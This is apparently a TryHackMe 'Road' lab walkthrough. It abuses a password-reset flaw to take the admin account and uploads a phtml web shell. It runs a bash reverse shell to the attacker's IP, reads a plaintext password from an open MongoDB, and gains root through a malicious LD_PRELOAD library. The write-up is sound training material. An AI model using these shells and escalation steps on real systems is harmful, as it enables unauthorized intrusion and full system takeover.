---
layout: single
title: Road tryhackme writeup
excerpt: "Medium linux machine in which we exploit a non-secure change password functionality, upload malicious files, interact with mongodb and exploit insecure LD_PRELOAD"
date: 2022-09-11
classes: wide
header:
  teaser: /assets/images/road/road.jpg
  teaser_home_page: true
  icon: /assets/images/tryhackme.png
categories:
  - writeup
tags:
  - tryhackme
  - LD_PRELOAD
  - mongodb
  - uploading files
---

![](/assets/images/road/road.jpg)

## User flag

Nothing really meaningful is found in the port scanning phase

```shell
sudo nmap -p- -sS --min-rate 5000 -n -vv 10.10.195.41
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With that done I checked the webpage. By clicking on the "Merchant central" we see a login/register page so I created an account and then logged in. Almost nothing was working on the dashboard except from the reset user page that lets you change your password. Since if doesn't ask you for your current password I thought it could be a CSRF but it turned out more interesting than that.

If we intercept the request with burp we can change the password to whatever account we please. So after founding the admin user in the profile -> upload photo section I changed it's password to test. This would allow us to upload files from the upload photo section.

```
POST /v2/lostpassword.php HTTP/1.1

Host: 10.10.195.41

Content-Length: 538

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://10.10.195.41

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryesnSIzdbDxaMXJrZ

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://10.10.195.41/v2/ResetUser.php

Accept-Encoding: gzip, deflate

Accept-Language: es,en-US;q=0.9,en;q=0.8

Cookie: PHPSESSID=l9fjr8vlt1q03bt6ee4mrqu4e1; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0

Connection: close



------WebKitFormBoundaryesnSIzdbDxaMXJrZ

Content-Disposition: form-data; name="uname"



admin@sky.thm

------WebKitFormBoundaryesnSIzdbDxaMXJrZ

Content-Disposition: form-data; name="npass"



test

------WebKitFormBoundaryesnSIzdbDxaMXJrZ

Content-Disposition: form-data; name="cpass"



test

------WebKitFormBoundaryesnSIzdbDxaMXJrZ

Content-Disposition: form-data; name="ci_csrf_token"





------WebKitFormBoundaryesnSIzdbDxaMXJrZ

Content-Disposition: form-data; name="send"



Submit

------WebKitFormBoundaryesnSIzdbDxaMXJrZ--
```

Once logged as the admin I started trying to upload profile pictures, burp was telling me files were getting uploaded but my profile picture was still the same. I had to find where were the images. That con be found by looking at the html source code, a part near the end has a comment saying `/v2/profileimages`.

If you go to that directory you won't find anything but if you add the name of the file you uploaded you will see it. I also found out you can upload php files but when you try and execute the server won't respond. However this does not happen with phtml so I uploaded a phtml cmd and a bash reverse shell and executed them to gain remote access.

bash\_rev\_shell.txt
```shell
bash -i >& /dev/tcp/10.18.52.67/7777 0>&1
```

cmd.phtml
```shell
`<?php system($_GET['cmd']); ?>
```

At this point you can get a reverse shell by executing `cat bash_rev_shell.txt | bash` in the phtml cmd just like this


```
http://10.10.195.41/v2/profileimages/cmd.phtml?cmd=cat%20bash_rev_shell.txt%20|%20bash
```

Then as always we fix the tty

```shell
[dasor@archlinux ~]$ nc -lvp 7777
Connection from 10.10.195.41:49282
bash: cannot set terminal process group (561): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sky:/var/www/html/v2/profileimages$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$ stty raw -echo;fg
[1]  + continued  nc -lvp 7777
                              script /dev/null -c bash
                                                      Script started, file is /dev/null
                                                                                       www-data@sky:/var/www/html/v2/profileimages$
www-data@sky:/var/www/html/v2/profileimages$ stty rows 30 columns 132
www-data@sky:/var/www/html/v2/profileimages$ export TERM=xterm
```

At this point we get the first flag from the user webdeloper's home

## Root Flag

Now by looking at the /etc/passwd we can see mysql and mogodb are running, first I tried to enter to mysql but I couldn't. However mongodb didn't require any password

```shell
www-data@sky:/var/www/html/v2/profileimages$ mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("83a83455-4816-497c-9849-d2f82b40fa9d") }
MongoDB server version: 4.4.6
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
        https://community.mongodb.com
---
The server generated these startup warnings when booting:
        2022-09-11T13:53:32.987+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2022-09-11T13:54:37.040+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup
switched to db backup
> show collections
collection
user
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

Well we found the user's password let's login and see how can we escalate to root.

```shell
www-data@sky:/var/www/html/v2/profileimages$ su webdeveloper
Password:
webdeveloper@sky:/var/www/html/v2/profileimages$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

Well sudo -l gives us just what we need to get root. If you don't know the `env_keep+= LD_PRELOAD ` means keep the environment variable LD\_PRELOAD when executing sudo. This environment variable defines the libraries that are getting loaded before all others so if we create our own malicious C library it will get executed. Let me show you.


```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```

This code just unsets the variable (so it won't loop forever) and then drops a root shell. To compile it like a library just use

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Now with the library compiled let's just tell the binary to use it like this

```shell
webdeveloper@sky:/dev/shm$ sudo LD_PRELOAD=/dev/shm/shell.so /usr/bin/sky_backup_utility
# whoami
root
```

Make sure to write the absolute path for both the library and the binary. And just like that we are root on the system, thanks for reading!
